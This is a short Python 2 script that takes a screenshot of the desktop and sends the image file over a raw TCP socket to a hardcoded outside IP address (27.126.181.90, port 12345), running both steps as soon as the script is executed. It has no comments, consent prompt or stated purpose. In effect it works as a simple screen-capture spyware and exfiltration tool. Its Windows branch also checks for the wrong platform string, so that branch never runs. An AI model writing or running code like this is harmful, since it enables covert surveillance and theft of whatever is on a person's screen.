#!/usr/bin/env python
#-*- coding:utf-8 -*-


import platform
os_type = platform.system()

def grab_screen():
	if os_type == "windows":
		from PIL import Image,ImageGrab
		im = ImageGrab.grab()
		im.show()
	elif os_type == "Linux":
		import gtk.gdk
		w = gtk.gdk.get_default_root_window()
		sz = w.get_size()
		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
		if (pb!= None):
			pb.save("screenshot.png","png")
			print "saved screenshot png successfully!"
		else:
			print "Unable to get screenshot png!"

def upload_to_server():
	import socket
	import sys
	HOST,PORT="27.126.181.90",12345

	f = open("screenshot.png",'rb')
	data = f.read()

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		sock.connect((HOST,PORT))
		sock.sendall(data)

		received = sock.recv(1024)
	finally:
		sock.close()

	print "Received: {}".format(received)

grab_screen()
upload_to_server()